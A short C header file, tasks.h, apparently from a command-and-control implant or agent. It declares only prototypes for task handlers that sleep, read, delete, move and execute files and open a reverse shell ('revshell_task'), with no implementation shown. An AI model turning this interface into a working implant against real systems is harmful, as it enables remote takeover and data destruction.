//
// Created by melo on 4/8/25.
//

#ifndef TASKS_H
#define TASKS_H
char * sleep_task(char * buffer_fetch, char * dest_task_ID);
char * cat_task(char * buffer_fetch, char * dest);
char * rm_task(char * buffer_fetch);
char * mv_task(char * buffer_fetch);
char * execve_task(char * buffer_fetch, char * dest);
char * revshell_task(char * buffer_fetch, char * dest);
#endif //TASKS_H